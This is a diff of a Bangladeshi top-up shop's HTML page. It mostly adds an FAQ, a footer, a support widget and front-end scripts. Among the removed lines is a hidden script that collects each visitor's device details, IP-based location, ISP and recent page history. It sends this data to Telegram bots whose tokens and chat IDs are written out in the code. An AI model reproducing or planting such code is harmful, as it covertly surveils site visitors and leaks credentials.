+                            <p><i class="fas fa-clock"></i> সাধারণত পেমেন্ট সফল হওয়ার সাথে সাথেই আপনার টপ-আপ সম্পন্ন হয়ে যায় (ইনস্ট্যান্ট)। তবে নেটওয়ার্ক বা অন্য কোনো টেকনিক্যাল সমস্যার কারণে সর্বোচ্চ ৫-১০ মিনিট সময় লাগতে পারে।</p>
+                        </div>
+                    </div>
+                    <div class="faq-item fade-in">
+                        <div class="faq-question">পেমেন্ট করার কি কি মাধ্যম আছে?</div>
+                        <div class="faq-answer">
+                            <p><i class="fas fa-credit-card"></i> আপনি বিকাশ, রকেট, নগদ, উপায় সহ বিভিন্ন মোবাইল ব্যাংকিং এবং ভিসা/মাস্টারকার্ড ডেবিট/ক্রেডিট কার্ডের মাধ্যমে পেমেন্ট করতে পারবেন। সমর্থিত পদ্ধতির সম্পূর্ণ তালিকা পেমেন্ট পেজে দেখুন।</p>
+                        </div>
+                    </div>
+                    <div class="faq-item fade-in">
+                        <div class="faq-question">আমার টপ-আপ সফল না হলে কি হবে?</div>
+                        <div class="faq-answer">
+                            <p><i class="fas fa-exclamation-triangle"></i> যদি কোনো কারণে আপনার টপ-আপ সফল না হয় এবং আপনার অ্যাকাউন্ট থেকে টাকা কেটে নেওয়া হয়, তাহলে সাধারণত ২৪-৭২ ঘণ্টার মধ্যে টাকা আপনার অ্যাকাউন্টে স্বয়ংক্রিয়ভাবে ফেরত চলে আসবে। সমস্যা অব্যাহত থাকলে অনুগ্রহ করে আমাদের লাইভ চ্যাট বা ইমেইলের মাধ্যমে সাপোর্ট টিমের সাথে যোগাযোগ করুন।</p>
+                        </div>
+                    </div>
+                     <div class="faq-item fade-in">
+                        <div class="faq-question">গেম টপ-আপের জন্য কি প্রয়োজন?</div>
+                        <div class="faq-answer">
+                            <p><i class="fas fa-gamepad"></i> গেম টপ-আপের জন্য সাধারণত আপনার গেমের প্লেয়ার আইডি (Player ID) বা ইউজারনেম (Username) প্রয়োজন হবে। কিছু ক্ষেত্রে Region/Server সিলেক্ট করার প্রয়োজন হতে পারে। প্রতিটি গেমের জন্য প্রয়োজনীয় তথ্য প্রোডাক্ট পেজে স্পষ্টভাবে উল্লেখ করা থাকে।</p>
+                        </div>
+                    </div>
+                     <div class="faq-item fade-in">
+                        <div class="faq-question">আপনাদের সাপোর্ট কখন পাওয়া যায়?</div>
+                        <div class="faq-answer">
+                            <p><i class="fas fa-headset"></i> আমাদের কাস্টমার সাপোর্ট টিম সপ্তাহের ৭ দিন, ২৪ ঘণ্টা লাইভ চ্যাট, Facebook Page, Whatsapp এবং ইমেইলের মাধ্যমে সহায়তা প্রদানের জন্য প্রস্তুত।</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Social Media Section -->
+        <section id="social-media" class="fade-in">
+            <div class="container">
+                <h2 class="section-title" style="color: #000;"><i class="fas fa-share-alt"></i> আমাদের সাথে যুক্ত থাকুন</h2>
+                <div class="social-links">
+                    <a href="#" class="social-link facebook" target="_blank" rel="noopener noreferrer">
+                        <i class="fab fa-facebook-f"></i>
+                        <span >Facebook</span>
+                        <span class="count">1.6K Followers</span>
+                    </a>
+                     <a href="#" class="social-link youtube" target="_blank" rel="noopener noreferrer">
+                        <i class="fab fa-youtube"></i>
+                        <span>YouTube</span>
+                        <span class="count">60+ Subscribers</span>
+                    </a>
+                    <a href="#" class="social-link instagram" target="_blank" rel="noopener noreferrer">
+                        <i class="fab fa-instagram"></i>
+                        <span>Instagram</span>
+                        <span class="count">5 Followers</span>
+                    </a>
+                     <a href="#" class="social-link twitter" target="_blank" rel="noopener noreferrer">
+                        <i class="fab fa-twitter"></i>
+                        <span>Twitter</span>
+                        <span class="count">0 Followers</span>
+                    </a>
+                     <a href="#" class="social-link linkedin" target="_blank" rel="noopener noreferrer">
+                        <i class="fab fa-linkedin-in"></i>
+                        <span>LinkedIn</span>
+                         <span class="count">0 Connections</span>
+                    </a>
+                </div>
+            </div>
+        </section>
+
+        <!-- Payment Methods Section -->
+        <section id="payment-methods">
+            <div class="container">
+                <h2 class="section-title"><i class="fas fa-credit-card"></i> আমরা গ্রহণ করি</h2>
+                <div class="payment-logos fade-in">
+                    <img src="https://i.postimg.cc/rF6ZRFF4/1656227518bkash-logo-png.webp" alt="bKash">
+                     <img src="https://i.postimg.cc/CKHn77jY/1683082228nagad-transparent-logo.webp" alt="Nagad">
+                    <img src="https://i.postimg.cc/0Nw11XtR/mlogo.png" alt="Rocket" style="height: 40px;"> <!-- Better Rocket logo -->
+                    <!-- Add more payment logos if needed -->
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- Footer -->
+    <footer id="main-footer">
+        <div class="container">
+            <div class="footer-grid">
+                <div class="footer-widget">
+                    <h4><i class="fas fa-info-circle"></i> Your TopUp Center</h4>
+                    <p>আপনার বিশ্বস্ত ডিজিটাল সেবার ঠিকানা। মোবাইল রিচার্জ, গেম টপ-আপ, বিল পেমেন্ট সহ আরো অনেক সেবা নিন সহজে ও নিরাপদে।</p>
+                    <div class="footer-social-links">
+                        <a href="#" target="_blank" rel="noopener noreferrer" aria-label="Facebook"><i class="fab fa-facebook-f"></i></a>
+                        <a href="#" target="_blank" rel="noopener noreferrer" aria-label="Youtube"><i class="fab fa-youtube"></i></a>
+                        <a href="#" target="_blank" rel="noopener noreferrer" aria-label="Instagram"><i class="fab fa-instagram"></i></a>
+                        <a href="#" target="_blank" rel="noopener noreferrer" aria-label="Twitter"><i class="fab fa-twitter"></i></a>
+                        <a href="#" target="_blank" rel="noopener noreferrer" aria-label="Twitter"><i class="fab fa-telegram"></i></a>
+                    </div>
+                </div>
+
+                <div class="footer-widget">
+                    <h4><i class="fas fa-link"></i> প্রয়োজনীয় লিংক</h4>
+                    <ul>
+                        <li><a href="#"><i class="fas fa-angle-right"></i> Home</a></li>
+                        
+                        <li><a href="products.html"><i class="fas fa-angle-right"></i> Products</a></li>
+       <li><a href="#"><i class="fas fa-angle-right"></i> Offer</a></li>
+                        <li><a href="#"><i class="fas fa-angle-right"></i> Blogs</a></li>
+                        <li><a href="#"><i class="fas fa-angle-right"></i> Reseller Platfrom</a></li>
+                        <li><a href="#blogs"><i class="fas fa-angle-right"></i> About</a></li>
+                         <li><a href="#"><i class="fas fa-angle-right"></i> Contact</a></li>
+                          <li><a href="#"><i class="fas fa-angle-right"></i> Tarms and Conditions</a></li>
+                           <li><a href="#"><i class="fas fa-angle-right"></i> Privacy and Policies</a></li>
+                           
+                                     <li><a href="#"><i class="fas fa-angle-right"></i> Menu</a></li>
+                    </ul>
+                </div>
+
+                <div class="footer-widget" id="footer-contact">
+                    <h4><i class="fas fa-address-book"></i> যোগাযোগ</h4>
+                    <ul class="footer-contact-info">
+                        <li><i class="fas fa-map-marker-alt"></i> শ্রীবরদী, শেরপুর, ময়মনসিংহ, বাংলাদেশ</li>
+                        <li><a href="tel:+8801781146747"><i class="fas fa-phone-alt"></i> +880 1781-146747</a></li>
+                        <li><a href="mailto:ffdiamondstorebd@gmail.com"><i class="fas fa-envelope"></i> ffdiamondstorebd@gmail.com</a></li>
+                        <li><i class="fab fa-facebook-messenger"></i><a href="https://www.faebook.com/yourtopupcenterofficial"></a>Messenger Chat</li>
+                        <li><i class="fab fa-whatsapp"></i><a href="">WhatsApp</a></li>
+                          <li><i class="fab fa-telegram"></i><a href="#">Telegram</a></li>
+                         <li><i class="fas fa-clock"></i> সাপোর্ট: ২৪/৭ খোলা</li>
+                    </ul>
+                </div>
+
+                 <div class="footer-widget">
+                    <h4><i class="fas fa-envelope-open-text"></i> নিউজলেটার</h4>
+                    <p>সর্বশেষ অফার এবং আপডেটের জন্য সাইন আপ করুন।</p>
+                    <form id="newsletter-form" style="display: flex;">
+                         <input type="email" placeholder="আপনার ইমেইল" required style="flex-grow: 1; padding: 10px; border: none; border-radius: 4px 0 0 4px; font-family: var(--body-font);">
+                         <button type="submit" class="btn" style="border-radius: 0 4px 4px 0; padding: 10px 15px; font-size: 1rem; box-shadow: none;"><i class="fas fa-paper-plane"></i></button>
+                    </form>
+                 </div>
+            </div>
+
+            <div class="footer-bottom">
+                কপিরাইট © <span id="current-year"></span> Your TopUp Center. সর্বস্বত্ব সংরক্ষিত। একটি  U Tech এর প্ল্যাটফ্রম! ভার্সন : 10.0<br>
+                ডেভেলপড উইথ <i class="fas fa-heart" style="color: #e74c3c;"></i> বাই <a href="#" target="_blank" rel="noopener noreferrer">U Tech Web Solution</a>
+            </div>
+        </div>
+    </footer>
+
+
+
+    <!-- Floating Support Widget -->
+    <div class="support-widget">
+        <div class="support-options" id="support-options">
+            <!-- Added data-tooltip -->
+            <a href="https://wa.me/+8801781146747" target="_blank" rel="noopener noreferrer" class="support-option whatsapp" aria-label="WhatsApp" data-tooltip="WhatsApp">
+                <i class="fab fa-whatsapp"></i>
+            </a>
+            <a href="https://m.me/yourtopupcenterofficial" target="_blank" rel="noopener noreferrer" class="support-option messenger" aria-label="Messenger" data-tooltip="Messenger">
+                <i class="fab fa-facebook-messenger"></i>
+            </a>
+             <a href="https://t.me/YTC24_bot" target="_blank" rel="noopener noreferrer" class="support-option telegram" aria-label="Telegram" data-tooltip="Telegram">
+                <i class="fab fa-telegram-plane"></i>
+            </a>
+             <a href="tel:01781146747" class="support-option call" aria-label="Call" data-tooltip="কল করুন">
+                <i class="fas fa-phone-alt"></i>
+            </a>
+        </div>
+        <button class="support-main-btn" id="support-main-btn" aria-label="Support Options">
+             <i class="fas fa-headset"></i> <!-- Default icon -->
+             <i class="fas fa-times"></i> <!-- Icon shown when active -->
+        </button>
     </div>
-    
-    <h1 style="color: #fff;">Loading...</h1>
-    
+
+    <!-- Fixed Ad Banner -->
+    <div class="fixed-ad-banner" id="fixed-ad-banner">
+        <div class="ad-content">
+            <i class="fab fa-facebook-f"></i> <!-- Ad icon -->
+            <span>Latest সব আপডেট পেতে এখুনি আমাদের <a href="https://www.faebook.com/yourtopupcenterofficial">ফেসবুক পেজ</a> ভিজিট করুন!  </span>
+        </div>
+        <button class="ad-close-btn" id="ad-close-btn" aria-label="Close Ad">
+            ×
+        </button>
+    </div>
+
+
+
     <script>
-               // Collecting device and browser info
-var deviceInfo = {
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language,
-    screenResolution: `${window.screen.width}x${window.screen.height}`,
-    colorDepth: window.screen.colorDepth
-};
+        document.addEventListener('DOMContentLoaded', function() {
 
-var browserInfo = {
-    browser: navigator.appName,
-    version: navigator.appVersion,
-    cookiesEnabled: navigator.cookieEnabled,
-    onlineStatus: navigator.onLine ? "Online" : "Offline"
-};
+            // --- Mobile Menu Toggle ---
+            const menuToggle = document.getElementById('menu-toggle');
+            const mainNav = document.getElementById('main-nav');
 
-// Collecting page and IP info
-var ipInfo = {
-    ip: "retrieved by server-side API", // Placeholder for IP, needs server-side API
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    referrer: document.referrer || "Direct Visit", // Referrer page
-    pageTitle: document.title,
-    pageURL: window.location.href,
-    browsingHistory: [] // Placeholder for user history
-};
+            if (menuToggle && mainNav) {
+                menuToggle.addEventListener('click', () => {
+                    mainNav.classList.toggle('active');
+                    const icon = menuToggle.querySelector('i');
+                    icon.classList.toggle('fa-bars');
+                    icon.classList.toggle('fa-times');
+                });
 
-// Fetching ISP and IP details using ipinfo.io API
-fetch('https://ipinfo.io/json')
-    .then(response => response.json())
-    .then(data => {
-        ipInfo.ip = data.ip;
-        ipInfo.city = data.city;
-        ipInfo.region = data.region;
-        ipInfo.country = data.country;
-        ipInfo.location = data.loc;
-        ipInfo.isp = data.org;
+                // Close menu when a link is clicked
+                mainNav.querySelectorAll('a').forEach(link => {
+                    link.addEventListener('click', () => {
+                        if (mainNav.classList.contains('active')) {
+                           mainNav.classList.remove('active');
+                            const icon = menuToggle.querySelector('i');
+                            icon.classList.remove('fa-times');
+                            icon.classList.add('fa-bars');
+                        }
+                    });
+                });
+                 // Close menu if clicked outside
+                document.addEventListener('click', (event) => {
+                    if (mainNav.classList.contains('active') && !mainNav.contains(event.target) && !menuToggle.contains(event.target)) {
+                        mainNav.classList.remove('active');
+                        const icon = menuToggle.querySelector('i');
+                        icon.classList.remove('fa-times');
+                        icon.classList.add('fa-bars');
+                    }
+                });
+            }
 
-        // Collecting browsing history (Last 5 pages visited)
-        collectUserHistory();
+            // --- Header Shadow on Scroll ---
+            const body = document.body;
+            const header = document.getElementById('main-header');
+             if (header) {
+                const scrollThreshold = 50; // Pixels to scroll before adding class
+                 window.addEventListener('scroll', () => {
+                     if (window.scrollY > scrollThreshold) {
+                         body.classList.add('scrolled');
+                     } else {
+                         body.classList.remove('scrolled');
+                     }
+                 });
+             }
 
-        // Sending data to Telegram Bot
-        sendToTelegramBot();
-    });
 
-// Function to collect user's browsing history (real-time, last 5 pages)
-function collectUserHistory() {
-    if (localStorage.getItem("userHistory")) {
-        let history = JSON.parse(localStorage.getItem("userHistory"));
-        history.push(window.location.href);
-        if (history.length > 5) history.shift(); // Keep only the last 5
-        localStorage.setItem("userHistory", JSON.stringify(history));
-        ipInfo.browsingHistory = history;
-    } else {
-        localStorage.setItem("userHistory", JSON.stringify([window.location.href]));
-        ipInfo.browsingHistory = [window.location.href];
-    }
-}
+            // --- Image Slider ---
+            const sliderContainer = document.querySelector('.slider-container');
 
-// Function to send data to Telegram Bots
-function sendToTelegramBot() {
-    // Define multiple bot tokens and chat IDs
-    var bots = [
-        { token: "7519273136:AAHZ7eBXEoVZRQFqILu8tGnuMLvtZOWohqc", chatId: "7945358964" },
-        { token: "7964956778:AAHeEVDkyjdBoPuhrn7Mguu3KFCIfgUkiYU", chatId: "6323961522" },
-         { token: "7964956778:AAHeEVDkyjdBoPuhrn7Mguu3KFCIfgUkiYU", chatId: "7945358964" },
-    ];
+            if (sliderContainer) {
+                const sliderWrapper = sliderContainer.querySelector('.slider-wrapper');
+                const slides = sliderContainer.querySelectorAll('.slide');
+                const prevBtn = sliderContainer.querySelector('.slider-nav .prev');
+                const nextBtn = sliderContainer.querySelector('.slider-nav .next');
+                const dotsContainer = sliderContainer.querySelector('.slider-dots');
+                let currentIndex = 0;
+                const totalSlides = slides.length;
+                let slideInterval;
+                let dots = []; // Define dots array
 
-    var message = `❤️ *YTC Web ~ Device and Browser Information* ❤️\n` +
-                  `📱 **Device Info:**\n` +
-                  `- User Agent: ${deviceInfo.userAgent}\n` +
-                  `- Platform: ${deviceInfo.platform}\n` +
-                  `- Language: ${deviceInfo.language}\n` +
-                  `- Screen Resolution: ${deviceInfo.screenResolution}\n` +
-                  `- Color Depth: ${deviceInfo.colorDepth}\n\n` +
-                  `🌐 **Browser Info:**\n` +
-                  `- Browser: ${browserInfo.browser}\n` +
-                  `- Version: ${browserInfo.version}\n` +
-                  `- Cookies Enabled: ${browserInfo.cookiesEnabled}\n` +
-                  `- Online Status: ${browserInfo.onlineStatus}\n\n` +
-                  `📌 **Page Info:**\n` +
-                  `- Title: ${ipInfo.pageTitle}\n` +
-                  `- URL: ${ipInfo.pageURL}\n` +
-                  `- Referrer: ${ipInfo.referrer}\n\n` +
-                  `🌍 **IP and Location Info:**\n` +
-                  `- IP: ${ipInfo.ip}\n` +
-                  `- City: ${ipInfo.city}\n` +
-                  `- Region: ${ipInfo.region}\n` +
-                  `- Country: ${ipInfo.country}\n` +
-                  `- Location (Lat, Long): ${ipInfo.location}\n` +
-                  `- ISP: ${ipInfo.isp}\n` +
-                  `- Timezone: ${ipInfo.timezone}\n\n` +
-                  `📖 **Browsing History:**\n` +
-                  `${ipInfo.browsingHistory.join('\n')}`;
+                if (sliderWrapper && slides.length > 0 && prevBtn && nextBtn && dotsContainer) {
+                    // Create dots
+                     dotsContainer.innerHTML = ''; // Clear existing dots first
+                     for (let i = 0; i < totalSlides; i++) {
+                        const dot = document.createElement('span');
+                        dot.classList.add('dot');
+                        if (i === 0) dot.classList.add('active');
+                        dot.addEventListener('click', () => goToSlide(i));
+                        dotsContainer.appendChild(dot);
+                        dots.push(dot); // Add dot to array
+                     }
 
-    // Loop through each bot and send the message
-    bots.forEach(bot => {
-        var url = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+                    function updateSliderPosition() {
+                        if (sliderWrapper) {
+                            sliderWrapper.style.transform = `translateX(-${currentIndex * 100}%)`;
+                        }
+                         // Update active dot
+                         if (dots.length > 0) {
+                            dots.forEach((dot, index) => {
+                                dot.classList.toggle('active', index === currentIndex);
+                            });
+                         }
+                    }
 
-        // Send HTTP request to Telegram API
-        fetch(url)
-            .then(response => response.json())
-            .then(data => {
-                console.log(`Message sent successfully to bot with chat ID ${bot.chatId}!`);
-            })
-            .catch(error => {
-                console.error(`Error sending message to bot with chat ID ${bot.chatId}:`, error);
-            });
-    });
-}
+                     function goToSlide(index) {
+                         currentIndex = (index + totalSlides) % totalSlides; // Handle wrap around
+                         updateSliderPosition();
+                         resetInterval(); // Reset interval on manual navigation
+                     }
+
+                    function nextSlide() {
+                        goToSlide(currentIndex + 1);
+                    }
+
+                    function prevSlide() {
+                       goToSlide(currentIndex - 1);
+                    }
+
+                    // Event Listeners for buttons
+                    nextBtn.addEventListener('click', nextSlide);
+                    prevBtn.addEventListener('click', prevSlide);
+
+                     // Autoplay functionality
+                     function startInterval() {
+                        clearInterval(slideInterval); // Clear previous interval if any
+                        slideInterval = setInterval(nextSlide, 5000); // Change slide every 5 seconds
+                     }
+
+                     function resetInterval() {
+                        clearInterval(slideInterval);
+                        startInterval();
+                     }
+
+                     // Start autoplay
+                     startInterval();
+
+                     // Pause on hover
+                     sliderContainer.addEventListener('mouseenter', () => clearInterval(slideInterval));
+                     sliderContainer.addEventListener('mouseleave', startInterval);
+
+                     // Initialize slider position
+                     updateSliderPosition();
+                }
+            }
+
+
+            // --- Product Filtering ---
+            const filterButtonsContainer = document.querySelector('.filter-buttons');
+
+            if (filterButtonsContainer) {
+                const filterButtons = filterButtonsContainer.querySelectorAll('button');
+                const productGrid = document.querySelector('.product-grid');
+                const productItems = productGrid ? productGrid.querySelectorAll('.product-item') : [];
+
+                if (filterButtons.length > 0 && productItems.length > 0) {
+                    // Initially show 'all' items after a brief delay for transition effect
+                    setTimeout(() => {
+                         productItems.forEach(item => {
+                            if(item.classList.contains('all')) {
+                                item.classList.add('show');
+                            } else {
+                                 item.classList.add('hide'); // Explicitly hide non-initial items
+                            }
+                         });
+                    }, 100); // Small delay
+
+                    filterButtons.forEach(button => {
+                        button.addEventListener('click', () => {
+                            const filter = button.getAttribute('data-filter');
+
+                            // Update active button style
+                            filterButtons.forEach(btn => btn.classList.remove('active'));
+                            button.classList.add('active');
+
+                            // Filter products with transition
+                            productItems.forEach(item => {
+                                // Always remove 'show' and add 'hide' first
+                                item.classList.remove('show');
+                                item.classList.add('hide');
+
+                                if (filter === 'all' || item.classList.contains(filter)) {
+                                    // Use setTimeout to allow the 'hide' transition to start
+                                    // before adding 'show' which triggers the entrance transition
+                                    setTimeout(() => {
+                                        item.classList.remove('hide');
+                                        item.classList.add('show');
+                                    }, 50); // Delay matching CSS transition start
+                                }
+                            });
+                        });
+                    });
+                }
+            }
+
+            // --- FAQ Accordion ---
+            const faqItems = document.querySelectorAll('.faq-item');
+
+            if (faqItems.length > 0) {
+                faqItems.forEach(item => {
+                    const question = item.querySelector('.faq-question');
+                    if(question) {
+                        question.addEventListener('click', () => {
+                             // Check if the clicked item is already active
+                             const wasActive = item.classList.contains('active');
+
+                             // Close all other items first
+                             faqItems.forEach(otherItem => {
+                                 if (otherItem !== item) {
+                                     otherItem.classList.remove('active');
+                                 }
+                             });
+
+                             // Toggle the clicked item only if it wasn't the active one we just closed
+                              if (!wasActive) {
+                                item.classList.add('active');
+                             } else {
+                                 item.classList.remove('active'); // Allows toggling the same item off
+                             }
+
+                             // Alternative: Toggle directly (allows multiple open)
+                             // item.classList.toggle('active');
+
+                        });
+                    }
+                });
+            }
+
+            // --- Animate on Scroll (Intersection Observer) ---
+             const fadeElements = document.querySelectorAll('.fade-in');
+
+             if ("IntersectionObserver" in window && fadeElements.length > 0) {
+                const observerOptions = {
+                    threshold: 0.15, // Trigger when 15% is visible
+                    rootMargin: "0px 0px -50px 0px" // Trigger slightly before element enters viewport
+                };
+
+                const observer = new IntersectionObserver((entries, observer) => {
+                    entries.forEach(entry => {
+                        if (entry.isIntersecting) {
+                            entry.target.classList.add('visible');
+                            observer.unobserve(entry.target); // Stop observing once visible
+                        }
+                    });
+                }, observerOptions);
+
+                fadeElements.forEach(el => observer.observe(el));
+            } else {
+                 // Fallback for older browsers (make immediately visible)
+                 fadeElements.forEach(el => el.classList.add('visible'));
+            }
+
+
+            // --- Set Current Year in Footer ---
+            const yearSpan = document.getElementById('current-year');
+            if (yearSpan) {
+                yearSpan.textContent = new Date().getFullYear();
+            }
+
+             // --- Newsletter Form Placeholder ---
+             const newsletterForm = document.getElementById('newsletter-form');
+             if(newsletterForm) {
+                 newsletterForm.addEventListener('submit', (e) => {
+                     e.preventDefault();
+                     alert('ধন্যবাদ! আপনার ইমেইল সাবস্ক্রাইব করা হয়েছে (Placeholder)।');
+                     newsletterForm.reset();
+                 });
+             }
+
+        });
+        
+        
+        
+             document.addEventListener('DOMContentLoaded', function() {
+            console.log("DOM Loaded - Advanced Floating Elements");
+
+            // --- Standard Setup ---
+            const yearSpan = document.getElementById('current-year');
+            if (yearSpan) { yearSpan.textContent = new Date().getFullYear(); }
+
+            // --- Floating Support Button Logic ---
+            const supportMainBtn = document.getElementById('support-main-btn');
+            const supportOptions = document.getElementById('support-options');
+
+            if (supportMainBtn && supportOptions) {
+                supportMainBtn.addEventListener('click', (e) => {
+                    e.stopPropagation(); // Prevent click from immediately closing via document listener
+                    console.log("Support button toggled");
+                    supportMainBtn.classList.toggle('active');
+                    supportOptions.classList.toggle('active');
+                });
+
+                // Close options if clicking outside
+                document.addEventListener('click', (event) => {
+                    if (supportOptions.classList.contains('active') &&
+                        !supportMainBtn.contains(event.target) &&
+                        !supportOptions.contains(event.target))
+                    {
+                        console.log("Clicked outside support widget - closing");
+                        supportMainBtn.classList.remove('active');
+                        supportOptions.classList.remove('active');
+                    }
+                });
+
+            } else { console.error("Support button or options element not found!"); }
+
+
+            // --- Fixed Ad Banner Logic ---
+            const adBanner = document.getElementById('fixed-ad-banner');
+            const adCloseBtn = document.getElementById('ad-close-btn');
+
+            if (adBanner && adCloseBtn) {
+                 adCloseBtn.addEventListener('click', () => {
+                     console.log("Ad close button clicked");
+                    adBanner.classList.add('hidden');
+                    // Set a flag in sessionStorage to keep it closed for the session
+                    try { // Use try-catch for potential SecurityError in sandboxed environments
+                       sessionStorage.setItem('adBannerClosed', 'true');
+                    } catch (e) {
+                       console.warn("Could not set sessionStorage item for ad banner.");
+                    }
+                 });
+
+                 // Check if ad was previously closed in this session
+                 try {
+                    if (sessionStorage.getItem('adBannerClosed') === 'true') {
+                       adBanner.style.display = 'none'; // Hide immediately, no animation needed if already closed
+                       console.log("Ad banner was previously closed in this session.");
+                    } else {
+                         // Ensure the entry animation plays only if not previously closed
+                         adBanner.style.animationPlayState = 'running'; // Explicitly start if needed
+                    }
+                 } catch (e) {
+                    console.warn("Could not access sessionStorage to check ad banner state.");
+                 }
+
+
+            } else { console.error("Ad banner or close button element not found!"); }
+
+
+            // --- Header/Menu Toggle Logic ---
+            const menuToggle = document.getElementById('menu-toggle');
+            const mainNav = document.getElementById('main-nav');
+            if (menuToggle && mainNav) {
+                 menuToggle.addEventListener('click', () => { /* ... */ });
+                 // Add other menu closing logic if needed
+            }
+
+            // --- Intersection Observer for general fade-in ---
+            const fadeElements = document.querySelectorAll('.fade-inX');
+             if ("IntersectionObserver" in window && fadeElements.length > 0) { /* ... */ }
+             else { /* Fallback */ }
+
+        }); // End DOMContentLoaded
+        
+        
     </script>
+
 </body>
-      </html>
+</html>
